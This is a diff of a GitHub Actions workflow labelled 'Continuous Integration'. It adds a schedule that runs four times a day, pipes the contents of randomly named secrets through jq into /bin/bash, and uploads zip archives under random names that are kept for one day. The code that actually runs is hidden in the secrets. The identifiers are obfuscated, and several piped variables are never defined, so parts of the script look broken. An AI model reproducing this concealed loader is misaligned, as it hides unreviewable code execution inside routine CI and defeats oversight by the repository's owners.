@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '42 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,16 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run pipeline
         env:
-          owifs29406: ${{ secrets.owifs29406 }}
+          cd575: ${{ secrets.cd575 }}
         run: |
-          printf '%s' "$owifs29406" | jq -r .ictha81596 | /bin/bash
-          echo $ygqp1910 | jq -r .mo3381 | /bin/bash
-          printf '%s' "$m8" | jq -r .ut94723 | /bin/bash
-          echo $vyltx93893 | jq -r .pcee2 | /bin/bash
+          printf '%s' "$cd575" | jq -r .z62 | /bin/bash
+          printf '%s' "$jfrve1" | jq -r .xew19 | /bin/bash
+          echo $z64 | jq -r .k0 | /bin/bash
+          printf '%s' "$sgwu007" | jq -r .neihm73777 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
         with:
-          name: 9EbHTorU
+          name: J3PXfpDV
           path: "*.zip"
           retention-days: 1
